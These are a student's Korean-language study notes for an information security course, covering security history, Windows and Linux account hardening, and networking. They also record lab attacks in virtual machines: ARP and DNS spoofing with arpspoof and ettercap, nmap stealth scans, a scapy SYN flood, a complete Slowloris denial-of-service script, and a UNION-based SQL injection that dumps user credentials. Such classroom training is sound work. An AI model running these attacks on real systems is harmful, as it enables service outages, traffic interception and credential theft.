# 정보 보안 개론





## 네트워크 구성방식



### NAT(Network Address Translation)



### NAT Network



### Bridged Adapter



### Internal Network



https://technote.kr/213





## 해킹과 보안의 역사

### 해킹이란?

- 국어사전 --> 다른 사람의 컴퓨터 시스템에 무단으로 침입하여 데이터와 프로그램을 없애거나 망치는 일
- 영어사전 --> 컴퓨터 조작을 즐기기, 무엇이나 숙고하지 않고 실행하기
- 영영사전
  - 디자이너가 의도하지 않았던 방법으로 시스템의 특성이나 규칙을 이용한 창조적인 사용법을 찾는 것





#### 1950년대 이전

- 1918년에 폴란드의 암호 보안 전문가들이 에니그마를 개발
- 알란 튜링이 최초의 컴퓨터 콜로서스를 개발

책 - The code book -사이먼 싱

#### 1960년대

- 운영체제 유닉스의 개발
- 전화망 침입을 통한 무료 전화 해킹

#### 1970년대

- 최초의 이메일 전송
- 마이크로소프트 설립
- 최초의 데스크톱 컴퓨터 솔
- 애플 컴퓨터의 탄생



#### 1980년대

- 초기의 PC
- 네트워크 해킹의 시작
- 카오스 컴퓨터 클럽
- 1983년 리처드 스톨만에 의해 GNU 계획이 세상에 알려짐

- 케빈 미트닉, 로버트 타판 모리즈



!책 거의 모든 인터넷의 역사





#### 1990년대

- 해킹 대회 데프콘
- 리눅스
- 윈도우 NT 3.1
- 해킹 도구의 개발
- 아메리칸은 온라인 해킹
- 트로이 목마, 백 오리피스



#### 2000년대

- 분산 서비스 거부 공격
- 웜과 바이러스
- 개인정보 유출과 도용
- 해킹 기술을 이용한 전자상거래 교란



#### 2010년대

- 농협 사이버테러
- APT공격
- 해킹 도구이자 해킹 대상이 되는 스마트폰



### 보안의 3대 요소

- 기밀성
  - 인가된 사용자만 정보 자산에 접근할 수 있는 것
- 무결성
  - 적절한 권한을 가진 사용자에 의해 인가된 방법으로만 정보를 변경할 수 있도록 하는 것
- 가용성
  - 정보 자산에 대해 적절한 시간에 접근 가능한 것을 의미



### 보안 전문가의 자격 요건



- 사이버 범죄
- 윤리의식
- 다양한 분야에 대한 전문성 
  - 운영체제
  - 네트워크
  - 프로그래밍
  - 서버
  - 보안 시스템
  - 모니털이 시스템
  - 암호
  - 정책과 절차



자격증 CISA, CISSP(All-in-one)



### 보안 관련 법

- 정보통신망법
- 



## 시스템 보안에 대한 이해

### 시스템 보안에 대한 이해

#### 시스템과 관련한 보안 기능

- 계정과 패스워드 관리
  - 사용자를 식별하기 위한 가장 기본적인 인증 수단
- 세션 관리
  - 사용자와 시스템 또는 두 시스템 간의 활성화된 접속에 대한 관리
  - 일정 시간이 지날 경우 세션을 종료
- 접근 제어
  - SSO
  - Zero Trust
- 권한 관리
- 로그 관리
  - 감사추적
  - 장애분석
  - 서비스 화면에서 보이지 않는 정보가 노출될 가능성이 있음
- 취약점 관리
  - 위의 보안 관리를 잘해도 시스템 자체의 결함에 의해 보안 문제가 발생 할 수 있다





## 계정 관리



#### 인증수단

- 계정은 시스템에 접근하는 가장 기본적인 방법
- 기본 구성 요소는 아이디와 패스워드
- 식별이란 아이디라는 문자열을 통해 그 자신이 누구인지 확인하는 과정
- 아이디만으로는 정확한 식별이 어려워 인증을 위한 다른 무언가를 요청



#### 패스워드 보안의 4가지 인증 방법

1. 알고 있는 것 : 패스워드
2. 가지고 있는 것 : 출입카드
3. 자신의 모습 : 지문 인식
4. 위치하는 곳 : 콜백



2가지 인증 수단을 섞는 것은 투팩타 2가지 이상은 멀티팩타



#### 윈도우 운영체제의 계정 관리

- 윈도우에서는 운영체제의 관리자 권한을 가진 계정을 administrator라고 한다.
- 사용자 계정을 모두 확인하려면 net users 명령을 사용한다
- 그룹 목록은 net localgroup  명령어로 확인할 수 있다
- RBAC (Role Based Access Control) : 유저가 빈번하게 변하는 경우에 간편하게 관리하기 위해 사용하는 모델
- ACL (Access COntrol List)2



##### 관리자 계정 관리

- 시작메뉴에서 lusrmgr.msc

- 계정사용 안함이나 이름을 변경

- 비밀번호를 추측 공격으로 뚫릴 가능성이 크다



##### Guest 계정 관리

- 비밀번호를 사용하지 않기 때문에 보안에 취약

- 계정사용 안함이나 이름을 변경



##### 불필요한 계정 관리

- 사용하지 않는 계정. 불필요한 계정, 의심스러운 계정이 있는지 점검하고, 사용하지 않는 계정은 삭제
- 임시로 생성한 계정이나 퇴사자의 계정은 불필요함으로 삭제
- 증적이 필요한 경우는 계정 사용 안함으로 변경
- net loalgroup administragors에서 불필요한 그룹 제거



##### 패스워드 관리

- 암호 정책의 세부 정책들을 확인하고 설정
- secpol.msc > 계정 정책 > 암호 정책
- 키사에서 나온 정책
  - 암호는 복잡성을 만족해야 함 : 사용
  - 최근 암호 기억 : 12개 암호 기억됨
  - 최대 암호 사용 기간 : 60일
  - 최소 암호 길이 : 8문자
  - 최소 암호 사용 기간(한번 바꾸면 일정 시간동안 유지하게 하는 것): 1일 
  - 해독 가능한 암호화를 사용하여 암호 저장 (시스템 간의 연동을 위해 자동으로 정보를 주고 받기 위해서 사용) : 사용 안 함



###### 관리자 그룹 관리

- 관리자 그룹에는 관리자 권한이 필요한 사용자를 제외하고는 포함하지 않는다
- 관리자 그룹 구성원은 해당 컴퓨터에 대해 모든 권한을 갖기 때문에 구성원 수를 제한한다



##### 계정 잠금 임계값 설정

- 사용자 계정을 잠금으로 설정하는 실패한 로그인 시도 횟수를 설정하며, 5회 설정을 권고한다
- 잠금 설정된 계정은 관리자가 다시 설정하거나 계정의 잠금 기간이 만료될 때까지는 사용할 수 없다







#### 리눅스의 계정 관리

##### /etc/passwd

- 계정 목록을 저장하고 있는 파일

root : x : 0 : 0 : root : /root : /bin/bash

   1      2  3   4      5          6            7

1. 사용자 계정
2. 패스워드가 암호화되어 shadow 파일에 저장되어 있음
3. 사용자 번호(UID:UserID)
4. 그룹 번호(GID: Group iD)
5. 사용자 이름
6. 사용자의 홈 디렉토리 설정
7. 사용자의 셸 정의로 기본 설정은 bash 셸이다



- 파일 접근 권한
  - drwxr-xr-x 2 root root 4096 Nov 10 17:26 alternatives

​                      1          2    3      4

1. 파일에 대한 접근 권한 
   1. d -> 파일이냐 디렉토리냐 파일 속성
   2. 첫번째 rwx : 파일 소유자의 권한
   3. 두번째 rwx : 그룹의 권한
   4. 세번째 rwx : 일반 권한
2. 해당 파일에 링크되어 있는 파일의 개수
3. 해당 파일을 생성한 계정
4. 해당 파일을 생성한 계정 이름



su : 이제부터 치는 모든 명령어는 관리자 권한을 가진다

sudo : 해당 명령어만 관리자 권한을 갖는다



- shadow 패스워드 이용

  - /etc/passwd 파일은 일반 사용자가 읽을 수 있으므로 위험

  - root : $1$9L~L0oTwd : 12751 : 0 : 99999 : 7 :     :     :   

       1                 2                     3       4        5       6   7    8    9

  1. 사용자 계정
  2. 암호화된 사용자의 패스워드 ($1$ = MD5, $5$ = SHA256, $6$ = SHA512)
  3. 1970년 1월 1일부터 마지막으로 패스워드를 변경한 날까지의 일자 수 
  4. 패스워드를 변경하기 전에 패스워드를 사용한 기간 (0 = 최초 설정 후 변경하지 않음)
  5. 패스워드를 변경하지 않고 사용할 수 있는 기간
  6. 패스워드 변경기간 만료 며칠 전부터 경고메세지를 보여줄지를 설정
  7. 계정에 대한 사용 제한을 설정하고 며칠 후에 완전히 사용을 정지할지 결정
  8. 1970년 1월 1일부터 계정이 완전 사용 정지된 날까지의 일자 수
  9. 관리자가 임의로 사용할 수 있는 부분



​	

pwconv

- shadow 파일 사용

pwunconv

- shadow 파일을 사용하지 않음

cat passwd | grep root

- cat : 뒤의 파일 내용을 보여달라 
- | grep root : root 라는 단어가 들어가는 행을 잡는다 

adduser user00

- 유저를 추가하는 명령어 adduser 뒤에 추가하려는 사용자의 이름을 입력

su - user00

- user00으로 사용자 전환



/etc/passwd 파일은 모든 사용자가 읽을 수 있으므로 계정 정보가 노출될 가능성이 높다.



##### umask

/etc/profile 의 맨 밑에 umask 022를 추가해준다

--> 이후에 생성되는 파일이나 디렉토리는 기본 권한에서 umask의 값만큼 빼고 생성된다 

- umask가 022일때 777--> 755





불필요한 쉘을 제거한다



/bin/false

- 시스템 로그인은 불가능, FTP 서버 프로그램 같은 프로그램도 불가능

- 쉘이나 SSH와 같은 터널링(원격접속) 그리고 홈디렉토리 사용 불가
- 로그인시 메세지가 안나오고 로그인이 안됨

/usr/sbin/nologin

- 로그인 불가, 메세지들은 반환
- SSH는 사용 불가능하며 FTP는 사용가능
- 메세지는 나오지만 로그인이 안됨

<br>



##### 텔넷 실습



ls -l /usr/bin/passwd 

소유자 권한 자리에 rwx대신 rws가 적혀있다

- 누가 실행하든 파일 소유자의 권한으로 파일이 실행된다

- 권한 상승이 일시적으로 일어난다

이러한 파일이 많으면 보안에 취악하니 찾아서 지워준다

- find / -user root -perm / 4000   
  - 사용자 실행 권한이 s인 것은 4000
  - 파일의 소유자가 root이면서 setuid 비트를 가진 파일로 검색 -->불필요한 파일을 삭제



<br>

##### 패스워드 복잡도

크래킹되기 쉬운 패스워드

- 길이가 너무 짧거나 널인 패스워드
- 사전에 나오는 단어나 이들의 조합 패스워드 --> **프로젝트때 참고**
- 키보드 자판을 일렬순으로 나열한 패스워드





##### 패스워드 크래싱 시간







## 시스템 보안 관리

##### 파일 시스템 체크

- NTFS파일 시스템은 FAT 파일 시스템에는 없는 데이터 접근에 대한 감사 기록, 파일 및 디렉터리에 대한 소유권 및 사용권한을 부여하는 등의 보안 기능을 제공한다
- FAT 파일 시스템을 사용할 경우, 비인가자에게 중요한 데이터 및 시스템 파일이 쉽게 노출될 수 있으므로 NTFS파일 시스템을 사용하도록 한다



##### 불필요한 공유 제거

- C$, D$, ADMIN$와 같은 기본 공유는 관리자가 네트워크 상에서 시스템을 관리하기 위해 기본적으로 마련된 것으로 관리 목적으로 사용하지 않는다면 제거해야 한다
- 불필요한 공유 디렉터리를 없애고, 필요하다면 공유 디렉터리의 접근 권한에서 Everyone 사용자 그룹을 삭제한다



##### SAM 파일 접근 통제

- SAM(Secuirty Account manager) 파일은 계정에 관한 정보를 보관하고 있는 파일로 적절한 접근 통제 및 설정이 필요하다 (리눅스의 passwd파일과 유사)



##### 마지막 사용자 이름 표시 안 함 설정



##### 로그인 하지 않고 시스템 종료 방지

- 안전한 시스템 종료를 보장하기 위해서는 사용자가 컴퓨터에 로그온 하여 권한이 있는 사람만 종료할 수 있게 한다

##### 예약 작업 관리(스케쥴)

- 의도하지 않은 예약이 등록되어 있는지 확인하고 불필요한 명령이 있다면 삭제한다



##### 이동식 디스크 보안 관리

- 이동식 디스크 자동 실행 옵션이 허용되어 있을 경우, "Autorun.inf"파일에 기록된 내용이 자동으로 실행될 때 악성 코드에 감염이 될 수 있으므로 이동식 디스크를 자동으로 실행되지 않도록 설정한다

##### 불필요한 서비스 제거

- 예약도 불필요한 것을 제거하듯이 서비스도 불필요한 것은 제거한다



##### 원격 데스크톱 서비스 설정

- 터미널 서비스 암호화 수준과 접속 타임아웃을 설정하고, 원격터미널 접속 가능한 사용자를 제안해야 한다







## 모바일 보안



안드로이드 보안

1. 루팅이 되면 안된다
2. 대부분 자바로 만들어져서 디컴파일이 가능하기 때문에 난독화를 통해 원본 파일이 유출되지 않게 한다

3. 쉐어드 유저 아이디
   - 루팅을 제외하고 같은 접근을 할 때에 동일한 유저 아이디를 사용한다

  

<br>

모바일 관려 보안 가이드

https://www.kisa.or.kr/public/laws/laws3.jsp

<br>

안드로이드 권한

https://developer.android.com/guide/topics/security/permissions.html?hl=ko

https://developer.android.com/guide/topics/permissions/overview?hl=ko



이전의 안드로이드 버전에서 권한 관리

--> 설치하는 시점에서 권한 허용을 사용자에게 물어봄

--> 설치후 실행할 때 권한 허용을 요청함

<br>

안드로이드에서의 서명

- 소유권을 구분 하는데 사용한다



아이폰에서의 서명

- 애플에서 인증한 인증서를 이용해서만 서명이 가능하다





## 네트워크 보안



7개의 개층으로 나뉜다

1. 물리 계층
2. 데이터 링크 계층
3. 네트워크 계층
4. 전송 계층
5. 세션 계층
6. 표현 계층
7. 응용 프로그램 계층



- 이더넷 어탭터 = LAN 카드 = NIC (Network Interface Controller)

- Ethernet 
  - LAN 영역에서 사용하는 통신 기술 중 하나
  - LAN 영역에서 사용하는 기술 중 사실상 표준(De Facto Standard) 방식
- IPv4
  - 총 32비트(0.0.0.0 ~ 255.255.255.255)로 구성된 주소 체계
  - 2의 32승개의 주소 표현이 가능하다

- IPv6 주소
  - 총 128비트
  - 2의 128승개의 주소 표현이 가능
- IP(Internet Protocol)
  - 인터넷 공간에서 자기 PC가 사용하는 고유한 식별자를 의미
  - IP 주소의 클래스(등급) - IP 주소의 첫번째 자리 범위
    - A 클래스 : 1~126 = 0000 00001 ~ 0111 1110
    - B 클래스 : 128~191 = 1000 0000 ~ 1011 1111
    - C 클래스 : 192~223 = 1100 0000 ~ 1101 1111
  - 구글에서 제공하는 DNS 서버의 IP 주소 = 8.8.8.8 --> A 클래스
  - KT에서 제공하는 DNS 서버의 IP 주소  = 168.126.63.1 --> B 클래스
  - 127.0.0.1 --> 어떤 클래스에도 속하지 않음 --> 자기가 사용하는 LAN 카드 자신을 의미 = 루프백 주소( loopback address)

- 서브넷 마스크(subnet mask)
  - IP 주소를 서브넷 마스크를 이용해 표기하는 방식
  - IP 주소를 네트워크 ID와 호스트 ID로 구분
    - IP								Subnet Mask							Network ID						Host ID
    - **10**.10.10.10 	          255.0.0.0                                   **10**                                       10.10.10

- <u>게이트웨이(gateway)</u> = <u>라우터(router)</u>  => 각기 다른 네트워크 ID를 사용하는 LAN 영역을 연결

  SW 측면 강조                  HW 측면 강조

- LAN 영역
  - 동일한 네트워크 ID를 공유하는 장치들의 집합
  - 동일한 게이트웨이 주소를 사용하는 장치들의 집합

- 라우팅(routing) 
  
  - 다른 네트워크 ID를 사용하는 LAN 영역을 연결
- 스위칭(switching) 
  
- LAN 영역에서 MAC 주소에 기반한 내부 통신
  
- 물리적 주소 = MAC 주소
  - LAN 카드에 부여된 주소로 LAN 영역에서 내부 통신을 수행하기 위해 필요한 주소
  - 48비트 = OUI + 일렬번호 
  - http://standards-oui.ieee.org/oui.txt
- DHCP (Dynamic Host Configuration Protocol)
  - 사용할 IP 주소 범위를 서버에 미리 등록하면, PC 사용자에게 IP 주소, 서브넷 마스크, 게이트웨이 주소 DNS 주소 등을 자동으로 할당해 주는 서비스
  - 유동 IP 환경
- DNS (Domain Name System) 서버
  
  - 도메인 이름과 IP 주소의 대응 관계를 데이터베이스 형태로 저장해 사용하는 서버

<br>

- IP = 32비트 = 네트워크 ID + 호스트 ID => IP 주소 기반에 라우팅
- MAN = 48비트 = OUI + 일렬번호 => MAC 주소 기반에 스위칭



##### arp

arp -d

arp -a

ping 8.8.8.8

arp -a

<br>

ping 

- 출발지 호스트(내 PC)와 목적지 호스트(8.8.8.8) 사이에서 회선의 연결 상태나 목적지 운영체제의 동작 여부를 점검하기 위한 도구

<br>



arp 스푸핑 공격

- A와 B의 통신 사이에서 C가 A에게는 B인척 B에게는 A인척 하면서 패킷을 엿보는 공격
- 게이트웨이를 주소를 속여서 프록시 같은 역할을 해서 왔다갔다 하는 패킷을 다 볼수가 있음

arp 방어

- MAC어드레스를 외운다
- type를 dynamic이 아닌 static으로 잡는다

<br>

##### arp 실습

Kali#2에서 아래 명령어를 실행

arpspoof -i eth0 -t <u>192.168.87.129</u> <u>192.168.87.2</u>

​								  WinXP의 IP         Gateway

WinXP에서 http://www.naver.com 로 접속 --> 접속 불가 --> arp 캐시 테이블을 확인

--> arp -a 

--> 테이블에 게이트웨이 IP주소의 MAC어드레스가 바뀐것을 확인 할 수 있음

Kali#2에서 터미널을 추가해서 아래 명령어를 실행

fragrouter -B1

fragrouter : base-1 : normal IP  forwarding



##### MTM (Man In The Middle) attack 

- 두 호스트 간에 통신을 하고 있을 때, 중간자가 사이에 끼어들어 통신 내용을 도청, 조작하는 공격

ettercap

- LAN 환경에서 중간자 공격을 수행할 수 있도록 구현한 프로그램
- GUI 제공 

- 다양한 플러그인을 제공



vi /etc/ettercap/etter.dns 로 해당파일에서 다음 3줄을 추가

\#						   ATTACKER'S IP ADDRESS

\*.naver.\* 	  A	192.168.52.129

\*.google.\* 	A	192.168.52.129



ettercap 실행명령어 : ettercap -G

<br>

스니핑 설정 및 실행

1. ettercap > sniffing > Unified sniffing > eth0 선택
   - Unified sniffing : 단일 NIC에서 sniffing
   - Bridged sniffing : Inline 방식으로 분석 후 전달
2. LAN 구간에 있는 hosts를 스캔 : Hosts > Scan for hosts
3. 스캔한 hosts 목록을 열기 : Hosts > Hosts list
4. 공격 대상 지정 <-- 끼어들 자리
   - Gateway(192.168.87.2) --> Add to Target 1
   - Victim PC(WinXP) --> Add to Target2
   - Target을 지정하지 않으면 Subnet에 연결되어 있는 모든 장치를 대상으로 공격
5. ARP Spoofing <-- 공격 대상에 ARP 테이블을 변조
   - Mitm > ARP poisoning > Sniff remote connections
   - Sniff remote connecctions : 이 컴퓨터의 모든 원격 연결을 감지
   - Only posion one-way : 단방향
6. DNS Spoofing <-- 희생자로부터 발생하는 DNS 쿼리에 대해 변조된 정보를 전달
   - Plugins > Manage the plugins > dns_spoof > 더블 클릭(선택) > 별표가 생기는 것을 확인
7. Kali#2에서 service apache2 start 명령어로 웹 서버를 기동 후 진행
8. WinXP에서 naver.com 또는 google.com 으로 접속 --> Kali#2에서 제공하는 페이지가 노출(표시)



##### nmap을 이용한 포트 스캐닝

- 네트워크에 연결되어 있는 호스트의 정보를 파악하는 도구
  - 네트워크에 견결되어 있는 호스트의 IP, OS
  - 열린 포트
  - 서비스 하는 소프트웨어 버전, ...

- TCP Open Scan
  - 정상적인 TCP 3-Way Handshaking 과정을 통해서 사용 중인 포트를 확인
  - 포트가 열려있으면           : SYN -- SYN/ACK  -- ACK
  - 포트가 열려있지 않으면  : SYN -- RST?ACK
  - 연결에 대한 로그가 남기 때문에 안전하지 않은 방법

<br>

Kali#1에서 wireshake를 키고

kali#2에서 다음 명령어를 실행

- nmap -sT 호스트\_IP
- nmap -sT 호스트_IP -p portNumber



Stealth Scan

- 3 way handshaking 과정을 거치지 않기 때문에  로그가 남지 않는다

- TCP half open scan / TCP SYN open scan ==> -sS

- FIN scan, XMAS scan, NULL scan

  - FIN : FIN  							==> -sF
  - XMAS : FIN, PSH, URG      ==> -sX
  - NULL :                                 ==> -sN

  ==> 포트가 열려 있으면 무응답
  ==> 포트가 닫혀 있으면 RST/ACK가 온다



##### scapy

- 파이썬으로 만들어져 있는 패킷 조작 도구
- 패킷 디코딩, 전송, 캡쳐, 수정 등 다양한 기능들 제공
- https://www.itlkorea.kr/data/scapy-pocket-guide0.2.pdf

<br>

- **실습**
  - IP 정보를 받아와서 확인
    - \>>> ip = IP()
    - \>>> ip.display()
  - 목적지 IP주소를 Kali#1으로 변경 후 IP정보를 확인
    - \>>> ip.dst = "192.168.111.130"
    - \>>> ip.display()
  - TCP 정보를 가져와서 확인
    - \>>> tcp = TCP()
    - \>>> tcp.display()
  - 출발지 포트번호를 랜덤하게 생성 후 TCP 정보를 확인
    - \>>> tcp.sport = RandNum(1024, 65535)
    - \>>> tcp.display()
  - SYN 패킷을 생성
    - \>>> syn = ip/tcp
  - SYN 패킷을 전송 후 첫번째 응답이 올 때까지 대기
    - \>>> syn_ack = sr1(syn)
  - SYN_ACK 패킷 확인
    - \>>> syn_ack.display()
  - ACK 패킷 생성
    - \>>> ack = ip/TCP(sport=syn_ack[TCP].dport, dport=80, flags="A", seq=syn_ack[TCP].ac, ack=syn_ack[TCP].seq+1)
  - ACK 패킷 전송
    - \>>> send(ack)



칼리#2에서 명령어 창에서 scapy 입력



##### TCP SYN Flooding 

- syn 쿠키 초기화
  - 칼리#1에서 sysctl -a | grep syncookies 명령어 실행
    
    - net.ipv4.tcp_syncookies = 1 >> 백로그 큐를 사용하지 않는다 ==> 응답이 없으면 바로 끊어버리는 것
  
  - sysctl -w net.ipv4.tcp_syncookies=0
  
  - Kali#2에서 RST 패킷이 외부로 나가지 않게 설정
  
    - \# iptables -A OUTPU -p tcp --tcp-flags RST RST -j DROP
  
  - Kali#2 방화벽 정책 확인
  
    - \# iptables -L -n
  
      Chain OUTPUT(policy ACCEPT)
  
      target port opt source destination
  
      DROP tcp -- 0.0.0.0/0 0.0.0.0/0 tcp flags:0x04/0x04
  
  - Kali#2에서 SYN flooding 공격
  
    - \>>> ip = IP()
    - \>>> ip.dst = "192.168.111.130"  (Kali#1의 IP)
    - \>>> tcp = TCP()
    - \>>> tcp.dport = 80
    - \>>> tcp.sport = RandNum(1024, 65535)
    - \>>> tcp.flags = "S"
    - \>>> syn = ip/tcp
    - \>>> send(syn, loop=True)
  
  - Kali#1에서 공격 확인
  
    - wireshack 에서 패킷 확인
    - \# netstat -an | grep -i syn_recv  명령어로 네트워크 상태 확인
  

##### Slowloris Attack

- HTTP 요청 헤더와 본문이 개행문자로 구분되는 특징을 이용한 공격
- 헤더의 끝을 나타내는 개행문자를 전달하지 않아 서버가 연결을 유지하도록 하는 공격

- slowloris.py 등의 이미 짜여져 있는 파일을 사용

```python

#! /usr/bin/env python

import sys
import time
from scapy.all import *

def slowloris (target, num) :
    print "start connect > {}".format(target)
    syn = []
    for i in range(num) :
        syn.append(IP(dst=target)/TCP(sport=RandNum(1024,65535),dport=80,flags='S'))
    syn_ack = sr(syn, verbose=0)[0]

    ack = []
    for sa in syn_ack :
        payload = "GET /{} HTTP/1.1\r\n".format(str(RandNum(1,num))) +\
        "Host: {}\r\n".format(target) +\
        "User-Agent: Mozilla/4.0\r\n" +\
        "Content-Length: 42\r\n"

        ack.append(IP(dst=target)/TCP(sport=sa[1].dport,dport=80,flags="A",seq=sa[1].ack,ack=sa[1].seq+1)/payload)
    
    answer = sr(ack, verbose=0)[0]
    print "{} connection success!\t Fail: {}".format(len(answer), num-len(answer))
    print "Sending data \"X-a: b\\r\\n\".."

    count = 1
    while True :
        print "{} time sending".format(count)
        ack = []
        for ans in answer :
            ack.append(IP(dst=target)/TCP(sport=ans[1].dport,dport=80,flags="PA",seq=ans[1].ack,ack=ans[1].seq)/"X-a: b\r\n")
        answer = sr(ack, inter=0.5, verbose=0)[0]
        time.sleep(10)
        count += 1

if __name__ == "__main__" :
    if len(sys.argv) < 3 :
        print "Usage: {} <target> <number of connection>".format(sys.argv[0])
        sys.exit(1)
    slowloris(sys.argv[1], int(sys.argv[2]))

```

Kali#1에서 서버 재 기동후 서버 상태 확인 및 wireshark 실행

\# service apache2 stop

\# service apache2 start

http://localhost/server-status 접속

<br>

Kali#2에서 아래 명령어를 실행

\# python slowloris.py KALI#1_IP 50



<br>

<br>

#### SQL Injection

Kali#1 : server 

Kali#2 : client

- man 이라는 단어를 입력해서 검색을 요청
- 서버에서 클라이언트에게 받은 파라미터로 데이타베이스에서 sql구문을 사용해서 값을 조회
- 조회된 값을 클라이언트에게 응답

[화면]

제목 : **man**

[전달 << 요청 파라미터를 통해서 전달]

sol_1.php?title=**man**

[사용 >> 쿼리문을 만드는데 사용될 것으로 유추]

select * from movies arer title = **'man'**

<br>

1. 입력값이 전달 및 사용 과정에서 아무런 조작이 발생하지 않는지 궁금???

[화면]

제목 : **man`**

[전달 << 요청 파라미터를 통해서 전달]

sol_1.php?title=**man`**

[사용 >> 쿼리문을 만드는데 사용될 것으로 유추]

select * from movies arer title = **'man`'**

<br>

실행결과

Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1

---> 백엔드 DB가 MySQL이라는 정보와 화면에서 입력한 값은 그대로 쿼리 생성 및 실행에 사용된다.

<br>

2. 정상적인 쿼리가 반환하는 컬럼의 개수를 확인

select * fro mives where title = '%**man ' order by 1 --**%'  <--- 제목이 man으로 끝나는 영화를 조회해서 첫번째 컬럼으로 정렬



select * fro mives where title = '%**man ' order by 1 --**%' 

~

select * fro mives where title = '%**man ' order by 8 --**%'

--> Error: Unknonw column '8' in ' order clause'

--> 정상적인 쿼리가 반환하는 컬럼의 개수는 7개이다

<br>

3. 정상적인 쿼리의 실행의 결과에 공격자가 원하는 쿼리의 실행 결과를 결합해서 화면에 출력

select * from movies where title = '%**man' UNION select 1,2,3,4,5,6,7 --** %'

화면 출력을 위해서는 쿼리 실행 결과에서 2, 3, 4, 5번째 컬럼의 정보만 사용

<br>

4. MySQL의 시스템 테이블을 이용해서 사용자 정의 테이블의 정보(이름)을 조회select * from movies where title = '%man' UNION select 1,table_schema,table_name,4,5,6,7 from information_schema.tables -- %'→ https://dev.mysql.com/doc/refman/8.0/en/tables-table.html 참조

5. 테이블 이름이 users인 테이블이 가지고 있는 컬럼 정보를 조회select * from movies where title = '%man' UNION select 1,table_name,column_name,4,5,6,7 from information_schema.columns where table_name = 'users' -- %'→ https://dev.mysql.com/doc/refman/8.0/en/columns-table.html
6. users 테이블 id, login, password, email, secret 컬럼의 정보를 조회select * from movies where title = '%man' UNION select 1,id,login,password,concat(email, " : ", secret),6,7 from users -- %'
7.  패스워드 정보가 안전하게 저장되어 있는지 확인6885858486f31043e5839c735d99457f045affd0https://crackstation.net/



---

**책**

웹 해킹&보안 완벽 가이드 

브라우저 해킹 vs 보안

---